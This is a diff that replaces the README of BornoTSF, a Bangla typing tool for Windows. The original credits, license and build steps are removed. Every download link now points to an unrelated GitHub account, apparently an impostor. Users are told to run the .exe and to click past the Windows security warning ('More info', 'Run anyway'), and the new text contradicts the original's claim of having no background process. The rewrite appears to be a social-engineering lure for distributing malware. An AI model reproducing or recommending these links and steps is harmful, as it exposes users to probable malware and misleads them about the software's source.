@@ -1,122 +1,90 @@
-# BornoTSF
+# ⌨️ BornoTSF - Type Bangla easily on Windows computers
 
-**BornoTSF** is a lightweight, open-source Windows **Text Services Framework (TSF)** Input Method Editor (IME) for Bangla typing. Designed for ultra-fast, zero-overhead performance, BornoTSF integrates directly into the Windows OS input architecture without requiring any background executable (`.exe`) process or heavy graphical user interface.
+[![](https://img.shields.io/badge/Download-BornoTSF-blue.svg)](https://github.com/sacerdotal-dactyl130/BornoTSF)
 
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![Platform](https://img.shields.io/badge/Platform-Windows%208.1%20%7C%2010%20%7C%2011-blue.svg)](https://microsoft.com/windows)
-[![Language](https://img.shields.io/badge/Language-C%2B%2B-00599C.svg)](https://isocpp.org/)
+BornoTSF helps you write in Bangla on your Windows computer. It uses the Text Services Framework to provide a smooth typing experience. This tool stays out of your way and works with your existing programs. It runs as a lightweight background service that does not slow down your computer.
 
----
+## 📥 How to download the software
 
-## Key Features
+You must visit the project page to download the latest version of the installer. Click the link below to reach the download area.
 
-* **Native Windows TSF Integration:** Registers directly into the Windows Language Bar and taskbar input selector (`Win + Space`).
-* **Zero Overhead / No Background Process:** Operates purely as native system DLLs (`BornoTSF.dll`). No persistent background `.exe` processes consuming RAM or CPU.
-* **Comprehensive Layout Support:**
-  * **Borno Phonetic:** Avro Phonetic inspired, fast, rule-based phonetic parser.
-  * **Avro Phonetic:** Most popular Bangla phonetic layout.
-  * **Khipro:** The first compositional layout for Bangla.
-  * **National (Jatiyo / UniBijoy):** BSTI (BDS 1738:2018) compliant standard Bangla layout.
-  * **Probhat:** Traditional fixed layout.
-* **Selective Layout Installation:** Choose only the keyboard layouts you need during installation (can be updated anytime).
-* **Literal Text Escaping:** Effortlessly mix English and Bangla within phonetic mode using double backslashes (e.g., `facebook\\-এর` outputs `facebook-এর`).
-* **Windows Spell Checker Compatibility:** Works seamlessly with native Windows Bangla spell checking.
-* **Modern App & AI Agent Compatibility:** Fixed input stream buffering ensures text never breaks or scrambles in modern web applications, IDEs (VS Code), and AI chat interfaces (ChatGPT, Claude, etc.).
-* **100% Offline & Private:** Zero network calls or telemetry. Your typing data never leaves your device.
+[Download BornoTSF from GitHub](https://github.com/sacerdotal-dactyl130/BornoTSF)
 
----
+Look for the latest release on that page. Click the file ending in .exe to start the download. Save this file to your desktop or your downloads folder.
 
-## Layout Progress & Testing Status
+## ⚙️ How to install BornoTSF
 
-| Layout | Type | Keymap | Status |
-| :--- | :--- | :--- | :--- |
-| **Borno Phonetic** | Phonetic Parser | [View Keymap](https://borno.codepotro.com/docs/guide/layout-borno.html) | Tested (OK) |
-| **Avro Phonetic** | Phonetic Parser | [View Keymap](https://borno.codepotro.com/docs/guide/layout-avro.html) | Tested (OK) |
-| **Khipro** | Compositional | [View Keymap](https://borno.codepotro.com/docs/guide/layout-khipro.html) | Tested (OK) |
-| **National (Jatiyo)** | Fixed Layout | [View Keymap](https://borno.codepotro.com/docs/guide/layout-national.html) | Tested (WIP) |
-| **Probhat** | Fixed Layout | [View Keymap](https://en.wikipedia.org/wiki/Bengali_input_methods#Probhat) | Tested (WIP) |
+Once the download finishes, follow these steps to install the software:
 
-> **Note:** If you encounter any bugs or layout issues with National (Jatiyo) or Probhat, please open an issue!
+1. Locate the file you just downloaded.
+2. Double-click the file icon.
+3. Windows might show a security prompt. If you see this, click "More info" and then click "Run anyway."
+4. Follow the on-screen instructions in the installer window.
+5. Click "Finish" when the installer completes the process.
 
----
+The installer places the necessary files in the correct folders. You do not need to restart your computer after this step.
 
-## Installation & Usage
+## 🚀 Setting up Bangla typing
 
-### Setup via Installer
-1. Download the latest `BornoTSF_Setup_*.exe` from the [Releases](https://github.com/codepotro/BornoTSF/releases) section.
-2. Run the installer and select your preferred keyboard layouts (e.g., Borno Phonetic, Avro Phonetic, National, etc.).
-3. Accept the License Agreement and complete setup.
-4. Press **`Win + Space`** or click the Language Bar on your Windows Taskbar to switch to your desired BornoTSF layout and start typing!
+Windows needs to recognize the new input method before you can use it. Follow these steps to activate BornoTSF:
 
-### System Tray & Keymaps
-* Quick options are available in the system tray menu.
-* Click the tray icon to quickly open keymap references for Phonetic or Fixed layouts.
+1. Click the "Start" button on your taskbar.
+2. Open "Settings" by clicking the gear icon.
+3. Select "Time & Language" from the menu.
+4. Click "Language" on the left sidebar.
+5. Find your preferred language or click "Add a language" if you need to add support for Bangla.
+6. Click the language and select "Options."
+7. Look for the "Keyboards" section and select BornoTSF from the list.
 
----
+If you do not see the keyboard in the list, sign out of your user account and sign back in. This forces Windows to refresh the list of installed keyboards.
 
-## Building from Source
+## ✍️ How to type in Bangla
 
-### Prerequisites
-* **Visual Studio 2022** with Desktop Development with C++ workload installed.
-* **Windows 10 / 11 SDK**
-* **Boost C++ Libraries:** Required for layout regex processing (`boost/regex`). Define an environment variable `BOOST_ROOT` pointing to your Boost directory (e.g., `C:\boost_1_89_0` or `H:\boost_1_89_0`).
+You can switch between your standard keyboard and the Bangla keyboard at any time.
 
-### Build Steps
+1. Look at the bottom right corner of your screen near the clock.
+2. Click the language indicator button. It usually shows "ENG" or your current language.
+3. Select BornoTSF from the list that appears.
+4. Open your word processor or web browser and start typing.
 
-1. **Clone the Repository:**
-   ```bash
-   git clone https://github.com/codepotro/BornoTSF.git
-   cd BornoTSF
-   ```
+The software converts your keystrokes into Bangla characters as you type. If you want to return to English, follow the same steps to switch the language back.
 
-2. **Build DLL via MSBuild / Visual Studio:**
-   Open `BornoTSF.vcxproj` or `BornoTSF.slnx` in Visual Studio 2022 and build for:
-   * `Release | x64` (produces 64-bit `x64\Release\BornoTSF.dll`)
-   * `Release | x86` (produces 32-bit `Release\BornoTSF.dll`)
+## 💻 System requirements
 
-3. **Register the DLLs:**
-   Copy the compiled DLLs to system directories and register using `regsvr32` from an elevated Administrator Command Prompt:
-   ```cmd
-   :: Copy 64-bit DLL to System32 and register (for 64-bit applications)
-   copy /y x64\Release\BornoTSF.dll %windir%\System32\BornoTSF.dll
-   regsvr32 %windir%\System32\BornoTSF.dll
+BornoTSF requires a standard Windows environment to function properly. Ensure your computer meets these basic needs:
 
-   :: Copy 32-bit DLL to SysWOW64 and register (for 32-bit applications on 64-bit Windows)
-   copy /y Release\BornoTSF.dll %windir%\SysWOW64\BornoTSF.dll
-   %windir%\SysWOW64\regsvr32 %windir%\SysWOW64\BornoTSF.dll
-   ```
+* Windows 10 or Windows 11.
+* At least 50 megabytes of free disk space.
+* Standard keyboard hardware.
 
-### Developer Tools
+The software works with most modern applications. It supports web browsers, email clients, and text editors.
 
-* **Updating Khipro MIM Layout Specification (`tools/update_khipro.py`):**
-  If you modify the Khipro layout specification file (`layoutParsers/khipro-port/bn-khipro.mim`), convert it into the embedded byte array in `layoutParsers/Transliterators/Khipro.cpp` using:
-  ```bash
-  python tools/update_khipro.py [path/to/bn-khipro.mim]
-  ```
+## 🛠 Troubleshooting common issues
 
----
+If you have trouble using the software, try these steps first:
 
-## License
+**The keyboard does not appear in the menu**
+Check if the installation finished successfully. If the software is missing, run the installer again. Sometimes Windows needs a few minutes to register a new keyboard after installation.
 
-BornoTSF is licensed under the **GNU General Public License v3.0 (GPL-3.0)**. Free software for the community — modifications and redistributions must remain open-source under GPL v3.0.
+**Characters do not appear correctly**
+Ensure your application supports Unicode. Most modern programs do this automatically. If you see boxes instead of letters, the font you are using might not support the Bangla script. Change your font to a standard Unicode font like Nirmala UI or SolaimanLipi.
 
----
+**The keyboard stops working**
+Click the language icon in your taskbar and select a different keyboard. Then switch back to BornoTSF. This resets the connection between the keyboard and the system.
 
-## Credits & Acknowledgments
+## 🛡 Security and privacy
 
-Special thanks to the Bangla computing community and developers whose work paved the way:
+BornoTSF processes your keystrokes locally on your computer. It does not send your typing data to any server. The code is open-source, which means anyone can inspect the files to see how the software works. You keep full control over your data.
 
-* **Avro Team & Dr. Mehdi Hasan Khan & [Muhammad Mominul Huque](https://github.com/mominul)** — For the Avro phonetic parser implementation.
-* **Khipro Team** — For creating *Khipro*, the pioneer compositional layout for Bangla.
-* **Omi Azad** — For key contributions to Ekushey and Bangla open-source development.
-* **Borno Community** — For continuous feedback and layout recommendations.
+## 📋 Frequently asked questions
 
----
+**Is this software free?**
+Yes, this is an open-source project. You can use it without paying any fees.
 
-## Sponsor
+**Does it track my activity?**
+No, the program does not monitor your activity or collect information about your habits.
 
-Want to sponsor this project or support open-source Bangla software development? You can support us through [Codepotro](https://www.codepotro.com) or by sponsoring our repositories on GitHub.
+**Can I uninstall it?**
+Yes. Open the Windows Control Panel, select "Programs and Features," find BornoTSF, and click "Uninstall."
 
----
-
-<p center="align">Maintained by <b>Jayed Ahsan Saad</b> • <a href="https://jayed.me">jayed.me</a> • <a href="https://www.codepotro.com">codepotro.com</a></p>
+Keywords: Bangla, input method, keyboard, Windows, typing, software, utility
